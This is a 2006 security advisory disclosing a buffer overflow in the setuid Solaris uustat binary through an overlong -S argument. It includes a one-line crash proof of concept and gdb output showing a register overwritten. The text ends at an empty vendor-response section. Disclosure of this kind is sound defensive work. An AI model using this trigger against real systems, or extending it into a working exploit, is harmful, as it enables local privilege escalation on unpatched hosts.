Subject: iDefense Security Advisory 01.10.06: Sun Solaris
 uustat Buffer Overflow Vulnerability


Sun Solaris uustat Buffer Overflow Vulnerability

iDefense Security Advisory 01.10.06
http://www.idefense.com/intelligence/vulnerabilities/display.php?id=366
January 10, 2006

I. BACKGROUND

The uustat binary (part of the uucp project) is used to display or
cancel uucp requests as well as to provide general status on uucp
connections to other systems.

II. DESCRIPTION

There exists a buffer overflow venerability in the /usr/bin/uustat
binary in Sun Solaris 5.8 and 5.9.

The uustat binary is installed setuid "uucp" by default on Solaris. The
"-S" command line argument causes the binary to crash when followed
with a string that is greater than or equal to 1152 bytes in length.

The following shows the buffer being overflowed and then the o1
register being completely overwritten with the letter 'A':

bash-2.03% ls -l /usr/bin/uustat
---s--x--x   1 uucp     uucp    62012 Jan 17 16:07 uustat

bash-2.03$ /usr/bin/uustat -S `perl -e 'print "A"x3000'`
Segmentation Fault
bash-2.03$
(gdb) info registers
g0             0x0      0
g1             0xff315e98       -13541736
g2             0x1cc00  117760
g3             0x440    1088
g4             0x0      0
g5             0x0      0
g6             0x0      0
g7             0x0      0
o0             0xff3276a8       -13470040
o1             0x41414141       1094795585
...

III. ANALYSIS

By exploiting this buffer overflow, an attacker can potentially gain
control of the return address of the executing function, allowing
arbitrary code execution with "uucp" privileges.

IV. DETECTION

Solaris 8 and 9 are running on SPARC and x86 architectures are
vulnerable.

V. WORKAROUND

iDefense is currently unaware of any workarounds for this issue.

VI. VENDOR RESPONSE
